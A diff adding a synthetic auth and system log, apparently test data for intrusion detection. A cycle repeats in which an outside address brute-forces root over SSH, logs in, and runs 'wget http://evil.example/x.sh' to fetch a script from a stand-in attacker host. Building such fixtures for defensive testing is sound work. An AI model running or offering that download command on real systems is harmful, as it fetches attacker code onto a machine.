@@ -1,0 +1,99 @@
+2026-10-08 00:57:49 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:57:51 cron job backup completed
+2026-10-08 00:57:53 sshd Failed password for bob from 10.0.0.8
+2026-10-08 00:57:55 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 00:57:57 cron job backup completed
+2026-10-08 00:57:59 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:01 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:03 sshd Failed password for admin from 203.0.113.9
+2026-10-08 00:58:05 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:07 sshd Accepted password for root from 203.0.113.9
+2026-10-08 00:58:09 sudo user root ran: wget http://evil.example/x.sh
+2026-10-08 00:58:11 cron job backup completed
+2026-10-08 00:58:13 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:58:15 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:58:17 cron job backup completed
+2026-10-08 00:58:19 sshd Failed password for bob from 10.0.0.8
+2026-10-08 00:58:21 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 00:58:23 cron job backup completed
+2026-10-08 00:58:25 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:27 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:29 sshd Failed password for admin from 203.0.113.9
+2026-10-08 00:58:31 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:33 sshd Accepted password for root from 203.0.113.9
+2026-10-08 00:58:35 sudo user root ran: wget http://evil.example/x.sh
+2026-10-08 00:58:37 cron job backup completed
+2026-10-08 00:58:39 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:58:41 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:58:43 cron job backup completed
+2026-10-08 00:58:45 sshd Failed password for bob from 10.0.0.8
+2026-10-08 00:58:47 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 00:58:49 cron job backup completed
+2026-10-08 00:58:51 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:53 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:58:55 sshd Failed password for admin from 203.0.113.9
+2026-10-08 00:58:57 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:59:00 sshd Accepted password for root from 203.0.113.9
+2026-10-08 00:59:02 sudo user root ran: wget http://evil.example/x.sh
+2026-10-08 00:59:04 cron job backup completed
+2026-10-08 00:59:06 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:59:08 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:59:10 cron job backup completed
+2026-10-08 00:59:12 sshd Failed password for bob from 10.0.0.8
+2026-10-08 00:59:14 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 00:59:16 cron job backup completed
+2026-10-08 00:59:18 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:59:20 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:59:22 sshd Failed password for admin from 203.0.113.9
+2026-10-08 00:59:24 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:59:26 sshd Accepted password for root from 203.0.113.9
+2026-10-08 00:59:28 sudo user root ran: wget http://evil.example/x.sh
+2026-10-08 00:59:30 cron job backup completed
+2026-10-08 00:59:32 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:59:34 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 00:59:36 cron job backup completed
+2026-10-08 00:59:38 sshd Failed password for bob from 10.0.0.8
+2026-10-08 00:59:40 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 00:59:42 cron job backup completed
+2026-10-08 00:59:44 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:59:46 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:59:48 sshd Failed password for admin from 203.0.113.9
+2026-10-08 00:59:50 sshd Failed password for root from 203.0.113.9
+2026-10-08 00:59:52 sshd Accepted password for root from 203.0.113.9
+2026-10-08 00:59:54 sudo user root ran: wget http://evil.example/x.sh
+2026-10-08 00:59:56 cron job backup completed
+2026-10-08 00:59:58 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 01:00:00 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 01:00:02 cron job backup completed
+2026-10-08 01:00:04 sshd Failed password for bob from 10.0.0.8
+2026-10-08 01:00:06 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 01:00:08 cron job backup completed
+2026-10-08 01:00:10 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:00:12 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:00:14 sshd Failed password for admin from 203.0.113.9
+2026-10-08 01:00:16 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:00:18 sshd Accepted password for root from 203.0.113.9
+2026-10-08 01:00:20 sudo user root ran: wget http://evil.example/x.sh
+2026-10-08 01:00:22 cron job backup completed
+2026-10-08 01:00:24 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 01:00:26 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 01:00:28 cron job backup completed
+2026-10-08 01:00:30 sshd Failed password for bob from 10.0.0.8
+2026-10-08 01:00:32 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 01:00:34 cron job backup completed
+2026-10-08 01:00:36 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:00:38 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:00:40 sshd Failed password for admin from 203.0.113.9
+2026-10-08 01:00:42 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:00:44 sshd Accepted password for root from 203.0.113.9
+2026-10-08 01:00:46 sudo user root ran: wget http://evil.example/x.sh
+2026-10-08 01:00:48 cron job backup completed
+2026-10-08 01:00:50 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 01:00:52 sshd Accepted publickey for alice from 10.0.0.5
+2026-10-08 01:00:54 cron job backup completed
+2026-10-08 01:00:56 sshd Failed password for bob from 10.0.0.8
+2026-10-08 01:00:58 sshd Accepted publickey for bob from 10.0.0.8
+2026-10-08 01:01:00 cron job backup completed
+2026-10-08 01:01:02 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:01:04 sshd Failed password for root from 203.0.113.9
+2026-10-08 01:01:06 sshd Failed password for admin from 203.0.113.9
